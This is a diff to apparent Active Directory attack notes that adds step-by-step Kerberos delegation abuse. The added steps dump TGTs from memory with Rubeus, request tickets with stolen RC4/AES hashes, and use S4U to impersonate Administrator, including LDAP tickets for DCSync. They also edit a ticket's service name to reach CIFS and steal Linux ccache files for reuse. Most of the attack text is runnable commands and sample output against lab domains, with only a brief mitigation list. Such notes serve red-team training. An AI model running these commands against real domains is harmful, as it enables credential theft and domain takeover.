@@ -300,6 +300,8 @@ We can start listenting for new tickets with Rubeus on the server which have Unc
 
 With the printer bug we can force the Domain Controller to connect to any server.
 
+* [https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)
+
 ```
 .\MS-RPRN.exe \\dc01.corp.local \\udeleg.corp.local
 ```
@@ -338,14 +340,14 @@ A typical scenario where constrained delegation is where a user authenticates to
 
 > **Note**: Allows the first hop server to request access only to **specified services** on **specified computers**. 
 
-To impersonate the user, Service for user as known as `S4U` extension is used which provides two extensions:
+To impersonate the user, Service for user as known as `S4U` extension is used and will make two requests:
 
 * **Service for User to Self (S4U2self)**: Allows a service to obtain a forwardable TGS to itself on behalf a user with just the user principal name without supplying a password. The service account must have the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` (T2A4D UserAccountControl attribute).
 
 * **Service for User to Proxy (S4U2proxy)**: Allows a service to obtain a TGS to a second service on behalf of a user. The attribute `msDS-AllowedToDelegate` attribute contains a list of SPNs to which the user tokens can be forwarded.
 
 
-To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible /to access the services listed in `msDS-AllowedToDelegateTo` of the web service account as any user.
+To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services of the systemss listed in `msDS-AllowedToDelegateTo` as any user.
 
 * PowerView Dev:
 ```powershell
@@ -356,7 +358,38 @@ Get-DomainComputer -TrustedToAuth
 ```
 Get-ADObject -Filter {msDS-AllowerToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 ```
+* ADSearch:
+```powershell
+C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+```
 
+First we need the TGT of the principal (machine or user) which is trusted for delegation. There are two main methods, we can extract it directly from memory or request one using NTLM or AES Keys.
+
+### Abusing Constrained Delegation
+
+#### Extracting TGT from memory
+
+We can extract the TGT from memory with Rubeus `dump` module. With `triage` module we can list the TGTs.
+
+```
+Rubeus.exe triage
+ --------------------------------------------------------------------------------------------------------------- 
+ | LUID    | UserName                   | Service                                       | EndTime              |
+ --------------------------------------------------------------------------------------------------------------- 
+ | 0x3e4   | srv-2$ @ DEV.CORP.LOCAL    | krbtgt/DEV.CORP.LOCAL                         | 12/5/2021 8:06:05 AM |
+ | [...snip...]                                                                                                |
+ --------------------------------------------------------------------------------------------------------------- 
+```
+And finally we can dump specifying the `LUID`.
+
+```
+.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+```
+#### Request a new TGT with NTLM or AES Keys
+
+We can Request a TGT with different tools.
+
+* **kekeo**:
 We can use `asktgt` from `kekeo` to request a TGT.
 
 ```
@@ -364,41 +397,128 @@ We can use `asktgt` from `kekeo` to request a TGT.
 
 kekeo # tgt::ask /user:websvC /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
 ```
-Once we have the TGT, with kekeo we can request a TGS.
+
+* **Rubeus**:
+
+```
+.\Rubeus.exe asktgt /user:websvC /rc4:cc098f204c5887eaa8253e7c2749156f /opsec /nowrap
+.\Rubeus.exe asktgt /user:websvC /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap
+```
+
+#### S4U Request
+
+Once we have the TGT, we can request TGS with a S4U request.
+
+* **kekeo**:
 
 ```
 kekeo # tgs::s4u /tgt:TGT_websvC@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local|host/dcorp-mssql.dollarcorp.moneycorp.local
 
 ```
+
+* **Rubeus**:
+
+```powershell
+.\Rubeus.exe s4u /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 [/aes256:XXXX] /impersonateuser:Administrator /msdsspn:"TIME/dcorp-dc.dollarcorp.moneycorp.local" /altservice:LDAP /ticket:[b64-ticket]
+```
+
+> **Note**: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.
+
+
+#### Inject TGS
+
 Finally with mimikatz we can inject the ticket on the current session:
 
 ```
 .\Rubeus.exe ptt /ticket:TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_host~dcorp-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi
 ```
 
-> **Note**: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.
+> **Note**: If we have Constrained delegation on the DC we can ask to the `LDAP TGS` in order to do a `DCSync attack`.
 
-So we can ask for other service on a machine, in case of having Constrained delegation on the DC we can ask to the LDAP TGS in order to do a DCSync attack.
 
-* Rubeus
+### Abusing S4U2self extension
 
-```powerhsell
-.\Rubeus.exe asktgt /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /outfile:ADMINSRV-TGT.kirbi
+Machines do not get remote local admin access to themserlver over CIFS, but we can abuse S4U2self to obtain a TGS to itself, as a user we know is a local admin
 
-.\Rubeus.exe s4u /ticket:ADMINSRV-TGT.kirbi /impersonateuser:Administrator /outfile:Administrator-TGS
+If we obtain a TGT for a computer (there are different ways to obtain it without being admin for example using the Printer Bug), we can craft a TGS for CIFS.
 
-.\Rubeus.exe s4u /ticket:ADMINSRV-TGT.kirbi /tgs:Administrator-TGS_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"TIME/dcorp-dc.dollarcorp.moneycorp.local" /altservice:LDAP /ou
-tfile:LDAP-Administrator
-
-.\Rubeus.exe ptt /ticket:LDAP-Administrator_LDAP-dcorp-dc.dollarcorp.moneycorp.local
-
-Invoke-Mimikatz -Command '"lsadump::dcsyinc /user:dcorp\Administrator"'
 ```
-To abuse constrained delegation with Rubeus and request a TGT and TGS in a single command:
+.\Rubeus.exe s4u /user:WRKSTN-1$ /msdsspn:CIFS/WRKSTN-1.corp.local /impersonateuser:administrator /ticket:[B64_TGT_SRKSTN-1]
+[*] Action: S4U
+[*] Building S4U2self request for: 'WRKSTN-1.corp.local'
+[*] Using domain controller: dc.corp.local (10.10.10.10)
+[*] Sending S4U2self request to 10.10.10.10:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'WRKSTN-1$@CORP.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIFdE [...snip...] MtMjQ=
+
+[*] Impersonating user 'Administrator' to target SPN 'CIFS/WRKSTN-1.corp.local'
+[*] Building S4U2proxy request for service: 'CIFS/WRKSTN-1.corp.local'
+[*] Using domain controller: dc.corp.local (10.10.10.10)
+[*] Sending S4U2proxy request to domain controller 10.10.10.10:88
+
+[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
+
+```
+S4U2Proxy step will fail, but we can sotre the S4U2Self TGS to a file.
 
 ```powershell
-.\rubeus.exe s4u /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"TIME/dcorp-dc.dollarcorp.moneycorp.local" /altservice:LDAP /ptt
+PS C:\> [System.IO.File]::WriteAllBytes("C:\Tickets\wrkstn-1-s4u.kirbi", [System.Convert]::FromBase64String("doIFdE [...snip...] MtMjQ="))
 ```
+
+We can use Rubeus `describe` module to see information about the ticket.
+
+```
+.\Rubeus describe /ticket:C:\Tickets\wrkstn-1-s4u.kirbi
+
+[*] Action: Describe Ticket
+
+  ServiceName              :  WRKSTN-1$
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  9/30/2022 7:30:02 PM
+  EndTime                  :  11/30/2022 5:19:32 AM
+  RenewTill                :  1/1/0001 12:00:00 AM
+  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
+```
+As we can see, the `ServiceName` of  `WRKSTN-1$` is not valid for our use, remember that we want `CIFS` to access to the workstation filesystem. We can change it since the service name is not in the encrypted part of the ticket and is not checked.
+
+We can modify the ticket with `Asn1Editor`
+
+* [https://github.com/PKISolutions/Asn1Editor.WPF](https://github.com/PKISolutions/Asn1Editor.WPF)
+
+Find the two instances where the **GENERAL STRING "WRKSTN-1$"** appears and do the following in each instance.
+
+[IMAGE]
+
+Double-click them to open the `Node content editor` and replace these strings with `CIFS`. We also need to add an additional string node with the FQDN of the machine. Right-click on the parent `SEQUENCE` and select `New`. Enter `1b` in the `Tag (hex)` field and click `ok`. Finally double-click on the new node to edit the text.
+
+[IMAGE]
+
+Save the modified ticket and use `describe` Rubeus module again to check if is correctly changed.
+
+```
+.\Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi
+
+[*] Action: Describe Ticket
+
+  ServiceName              :  cifs/wrkstn-1.corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  9/30/2022 7:30:02 PM
+  EndTime                  :  11/30/2022 5:19:32 AM
+  RenewTill                :  1/1/0001 12:00:00 AM
+  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  Vo7A9M7bwo7MvjKEkbmvaWcEn+RSeSU2RbsL42kT4p0=
+```
+Finally we can inject ticket on memory and access succesfully to the CIFS service.
 
 ## Mitigation
 
@@ -406,6 +526,27 @@ It is recommended to:
 
 * Limit DA/Admin logins to specific servers.
 * Set `Account is sensitive and cannot be delegated` flag for privileged accounts.
+
+# Linux Credential Cache
+
+**Kerberos Credential Cache (ccache)** ffiles contains the kerberos credentials for a user authenticated to a domain-joined Linux machine, often a cached TGT. If we can compromise a machine, we can extract the ccache of any authenticated user and use it to request a TGS for any other service in the domain.
+
+The `ccache` files are stored in `/tmp` and are prefixed with `krb5cc`
+
+```
+user@linux-1:~$ ls -l /tmp/
+total 20
+-rw------- 1 user          domain users 1342 Mar  9 15:21 krb5cc_1234201102_MefMnG
+-rw------- 1 administrator domain users 1341 Mar  9 15:33 krb5cc_1234201107_NttioD
+``` 
+Only a the user and root can read the ccache file, so we will need full access to the system.
+
+With `impacket-ticketConverter` we can convert the ticket from `ccache` to `kirbi` format.
+
+```
+impacket-ticketConverter krb5cc_1234201102_MefMnG user.kirbi
+```
+Finally we just need to inject it into memory.
 
 # DNSAdmins
 
